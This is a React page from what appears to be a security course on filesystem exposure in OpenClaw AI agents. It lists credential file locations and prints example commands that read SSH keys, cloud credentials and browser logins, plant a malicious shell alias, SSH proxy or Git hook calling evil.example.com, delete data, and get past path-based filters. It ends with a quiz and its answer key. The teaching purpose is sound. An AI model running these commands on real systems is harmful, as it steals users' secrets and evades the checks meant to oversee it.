import { useState } from 'react';
import {
  CodeBlock,
  NoteBlock,
  DefinitionBlock,
  ComparisonTable,
  WarningBlock,
  StepBlock,
  ExerciseBlock,
  ReferenceList,
} from '../../../components/content';

export default function FilesystemExposure() {
  return (
    <div className="space-y-6">
      <p className="text-gray-700 dark:text-gray-300 leading-relaxed">
        OpenClaw agents interact with the filesystem through two primary
        mechanisms: the built-in <code>read_file</code> and
        <code> write_file</code> tools, and the <code>execute_command</code>
        tool which can run any shell command including filesystem operations.
        By default, neither mechanism restricts which files or directories the
        agent can access. The agent runs with the same filesystem permissions
        as the OpenClaw Gateway process, which typically means read/write
        access to the entire user home directory and read access to most
        system files.
      </p>

      <DefinitionBlock
        term="Filesystem Exposure"
        definition="The security risk created when an AI agent has unrestricted read and/or write access to the host filesystem. The agent can access any file that the Gateway process owner can access, including sensitive configuration files, credentials, and system files outside the project directory."
        example="An agent asked to 'check the project configuration' could read ~/.aws/credentials, ~/.ssh/id_rsa, or /etc/shadow (if running as root), because nothing restricts its file access to the project directory."
        seeAlso={['Sandbox', 'Workspace Isolation', 'chroot']}
      />

      <WarningBlock title="Full Filesystem Access">
        <p>
          A vanilla OpenClaw agent can read every file accessible to the user
          running the Gateway. On a typical developer machine, this includes
          SSH private keys, cloud provider credentials, browser cookies and
          saved passwords, environment files from other projects, Git
          credentials, and potentially the contents of password managers that
          store data locally. The agent does not even need
          <code> execute_command</code> to access these files --
          <code> read_file</code> alone is sufficient.
        </p>
      </WarningBlock>

      <h3 className="text-xl font-semibold text-gray-800 dark:text-gray-200">
        Sensitive Files at Risk
      </h3>

      <p className="text-gray-700 dark:text-gray-300 leading-relaxed">
        Developer machines and CI servers contain a wealth of sensitive files
        that an unrestricted agent can access. The following table catalogs
        the most common targets and their locations on typical Linux and macOS
        systems.
      </p>

      <ComparisonTable
        title="Sensitive Files Accessible to Agents"
        headers={['File / Directory', 'Contains', 'Risk Level']}
        rows={[
          ['~/.ssh/id_rsa, ~/.ssh/id_ed25519', 'SSH private keys for server access', 'Critical'],
          ['~/.aws/credentials', 'AWS access key ID and secret access key', 'Critical'],
          ['~/.config/gcloud/', 'Google Cloud service account keys and tokens', 'Critical'],
          ['~/.azure/', 'Azure CLI authentication tokens', 'Critical'],
          ['~/.env, .env, .env.local', 'Application secrets, API keys, database URLs', 'Critical'],
          ['~/.gitconfig, ~/.git-credentials', 'Git authentication tokens', 'High'],
          ['~/.npmrc', 'npm registry authentication tokens', 'High'],
          ['~/.docker/config.json', 'Docker registry credentials', 'High'],
          ['~/.kube/config', 'Kubernetes cluster credentials', 'Critical'],
          ['~/.gnupg/', 'GPG private keys for signing', 'High'],
          ['~/.local/share/keyrings/', 'GNOME Keyring password store', 'Critical'],
          ['~/Library/Cookies/ (macOS)', 'Browser cookies for all sites', 'High'],
          ['~/.password-store/', 'pass/GPG-encrypted passwords', 'Critical'],
        ]}
      />

      <h3 className="text-xl font-semibold text-gray-800 dark:text-gray-200">
        Reading Sensitive Files
      </h3>

      <p className="text-gray-700 dark:text-gray-300 leading-relaxed">
        The most straightforward risk is direct file reading. An agent can
        use either the <code>read_file</code> tool or shell commands to
        access any file. In a prompt injection scenario or even through an
        innocent-seeming request, the agent might read credentials that
        are then included in its response or passed to subsequent tool calls.
      </p>

      <CodeBlock
        language="bash"
        title="Examples of sensitive file access"
        code={`# Direct read via read_file tool
# (Agent calls read_file with path: "~/.ssh/id_rsa")

# Via execute_command
cat ~/.aws/credentials
cat ~/.kube/config
cat ~/.env

# Searching for secrets across the filesystem
grep -r "API_KEY" ~/projects/
grep -r "password" ~/.config/
find ~ -name ".env" -type f 2>/dev/null

# Reading browser data (macOS example)
sqlite3 ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data \
  "SELECT origin_url, username_value FROM logins"`}
      />

      <h3 className="text-xl font-semibold text-gray-800 dark:text-gray-200">
        Accidental File Modification
      </h3>

      <p className="text-gray-700 dark:text-gray-300 leading-relaxed">
        Beyond reading sensitive data, unrestricted filesystem access also
        means the agent can modify or delete files outside the project
        directory. While agents are generally instructed to limit their
        changes to the project, confused or poorly prompted agents can
        accidentally modify system configuration, corrupt other projects,
        or delete important files.
      </p>

      <CodeBlock
        language="bash"
        title="Dangerous filesystem modifications"
        code={`# Agent might modify shell configuration
echo 'alias npm="malicious-script"' >> ~/.bashrc

# Overwrite SSH config
echo "Host *\n  ProxyCommand evil-proxy %h %p" > ~/.ssh/config

# Modify Git hooks in other projects
echo "curl https://evil.example.com" > ~/other-project/.git/hooks/pre-commit

# Delete files it thinks are "unnecessary"
rm -rf ~/old-project/  # Agent "cleaning up" workspace

# Modify system files (if running with elevated permissions)
echo "nameserver 10.0.0.1" > /etc/resolv.conf`}
      />

      <WarningBlock title="Write Access Compounds Read Risks">
        <p>
          An agent with write access can modify files to enable future attacks.
          It could add a malicious Git hook, modify shell configuration to
          intercept commands, alter SSH config to proxy connections through a
          malicious server, or inject code into other projects on the same
          machine. These modifications persist after the agent session ends
          and may not be noticed for days or weeks.
        </p>
      </WarningBlock>

      <h3 className="text-xl font-semibold text-gray-800 dark:text-gray-200">
        Cross-Project Contamination
      </h3>

      <p className="text-gray-700 dark:text-gray-300 leading-relaxed">
        When an operator runs OpenClaw for multiple projects on the same
        machine, the agent's unrestricted filesystem access creates a
        cross-contamination risk. An agent working on Project A can read
        source code, secrets, and configuration from Project B. This is
        particularly concerning in consulting or agency environments where
        different projects may belong to different clients with strict
        confidentiality requirements.
      </p>

      <CodeBlock
        language="bash"
        title="Cross-project access scenario"
        code={`# Agent working on ~/projects/client-a/ can read:
cat ~/projects/client-b/.env
cat ~/projects/client-b/src/config/database.ts
ls ~/projects/client-c/secrets/

# It can also read other agents' workspace files:
cat ~/projects/client-b/.openclaw/config.json
cat ~/projects/client-b/CLAUDE.md`}
      />

      <h3 className="text-xl font-semibold text-gray-800 dark:text-gray-200">
        Why Path-Based Filtering Falls Short
      </h3>

      <p className="text-gray-700 dark:text-gray-300 leading-relaxed">
        Some operators try to restrict filesystem access using
        <code> beforeToolUse</code> hooks that check file paths against an
        allowlist. Similar to network command filtering, this approach is
        fundamentally limited. Path-based filtering can be bypassed through
        symlinks, relative paths, path traversal sequences, and by using
        <code> execute_command</code> instead of the file tools.
      </p>

      <CodeBlock
        language="bash"
        title="Bypassing path-based restrictions"
        code={`# Symlink bypass
ln -s ~/.ssh/id_rsa ./project/totally-a-config-file.txt

# Path traversal
cat ./project/../../.ssh/id_rsa

# Using execute_command instead of read_file
cat /home/user/.aws/credentials

# Copying sensitive files into the allowed directory
cp ~/.env ./project/temp.txt`}
      />

      <NoteBlock type="info" title="OS-Level Filesystem Sandboxing">
        <p>
          Effective filesystem isolation requires enforcement at the operating
          system level. NemoClaw achieves this by running agent tool execution
          inside a sandboxed environment that mounts only the project directory
          and a minimal set of required system paths. The agent literally cannot
          see files outside the sandbox, regardless of what path it requests.
          This is fundamentally more secure than any application-level path
          filtering.
        </p>
      </NoteBlock>

      <ExerciseBlock
        question="An OpenClaw agent running on a developer's laptop is asked to 'check the project's database configuration.' Without filesystem restrictions, which of the following can the agent NOT do?"
        options={[
          'Read ~/.aws/credentials to find AWS database endpoints',
          'Read .env files from other projects in ~/projects/',
          'Access files on a separate machine in the same network',
          'Read the developer\'s SSH private keys',
        ]}
        correctIndex={2}
        explanation="Filesystem exposure is limited to the local machine. The agent cannot directly access files on other machines (though it could use network tools to connect remotely, which is a separate concern). All local files -- AWS credentials, other projects' .env files, and SSH keys -- are accessible if the Gateway process has permission to read them."
      />

      <ReferenceList
        references={[
          {
            title: 'CWE-22: Path Traversal',
            url: 'https://cwe.mitre.org/data/definitions/22.html',
            type: 'docs',
            description: 'Background on path traversal attacks relevant to filesystem exposure in agent systems.',
          },
          {
            title: 'Linux Namespaces and Sandboxing',
            url: 'https://man7.org/linux/man-pages/man7/namespaces.7.html',
            type: 'docs',
            description: 'OS-level isolation mechanisms that can restrict agent filesystem access.',
          },
        ]}
      />
    </div>
  );
}
